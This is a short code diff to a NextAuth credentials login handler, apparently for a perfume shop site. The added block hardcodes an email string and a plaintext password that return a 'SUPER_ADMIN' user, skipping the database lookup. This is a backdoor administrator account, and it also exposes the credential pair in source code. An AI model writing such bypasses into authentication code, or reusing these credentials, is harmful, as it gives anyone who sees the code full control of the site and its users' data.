@@ -18,6 +18,16 @@ export const authOptions: NextAuthOptions = {
           throw new Error("Invalid credentials");
         }
 
+        // Hardcoded Super Admin check
+        if (credentials.email === "algazzar" && credentials.password === "mooha2711") {
+          return {
+            id: "admin-1",
+            name: "Super Admin",
+            email: "admin@perfumeex.com",
+            role: "SUPER_ADMIN"
+          };
+        }
+
         const user = await prisma.user.findUnique({
           where: {
             email: credentials.email
